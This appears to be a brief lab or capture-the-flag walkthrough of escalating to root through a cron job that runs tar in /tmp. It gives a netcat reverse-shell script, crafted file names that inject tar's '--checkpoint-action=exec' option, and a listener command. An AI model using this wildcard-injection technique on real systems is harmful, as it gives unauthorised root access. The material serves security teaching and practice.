# 2⃣ Cron Jobs

A cron job is scheduled by the root user to run multiple system maintenance tasks. A byproduct of this task is the creation of a tar file in /tmp. This cron job fires every few minutes.



***

### Find a file

```
find / -name 3
```

### Code to connect to local port 1234 using netcat

```
printf '#! /bin/bash\nnc -e /bin/bash 127.0.0.1 1234' > shell.sh
```

### Specially crafted files to trigger shell.sh from tar

```
touch -- '--checkpoint-action=exec=sh shell.sh'
touch -- '--checkpoint=1'
```

### Start a netcat listener

```
nc -nvlp 1234
```

